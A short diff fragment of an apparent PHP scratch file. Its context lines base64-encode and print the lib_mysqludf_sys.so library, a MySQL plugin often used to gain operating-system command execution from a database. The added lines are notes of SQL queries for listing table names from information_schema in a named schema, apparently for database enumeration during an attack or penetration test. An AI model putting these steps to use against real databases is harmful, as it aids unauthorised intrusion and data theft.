@@ -84,4 +84,11 @@ echo $code;
 
 $dt1 = base64_encode(file_get_contents('./sql/lib_mysqludf_sys/lib_mysqludf_sys.so'));
 echo $dt1;
+
+GET TABLE NAME - SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA='u854855859_kever' LIMIT 1 OFFSET 0;
+SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 0
+
+
 //*/
+
+
